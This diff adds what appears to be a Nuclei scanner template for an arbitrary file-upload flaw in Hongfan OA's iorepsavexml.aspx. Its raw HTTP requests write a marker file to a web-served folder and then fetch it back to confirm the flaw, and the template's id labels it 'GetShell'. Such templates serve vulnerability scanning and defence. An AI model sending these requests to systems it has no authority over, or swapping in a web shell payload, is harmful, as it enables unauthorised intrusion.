@@ -1,0 +1,38 @@
+id: hongfanOA-iorepsavexml-aspx-GetShell
+info:
+  name: 红帆OA iorepsavexml.aspx 文件上传漏洞
+  author: cnaq
+  severity: critical
+  description: 红帆OA在上传时可被绕过上传的限制
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%BA%A2%E5%B8%86OA%20iorepsavexml.aspx%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  tags: hongfanOA,file,upload
+requests:
+  - raw:
+      - |
+        POST /ioffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename=qaxnb.txt&filepath=/upfiles/rep/pic/ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 0
+
+        qaxnb
+
+      - |
+        GET /ioffice/upfiles/rep/pic/qaxnb.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - '200'
+      - type: regex
+        part: body
+        regex:
+          - 'qaxnb'
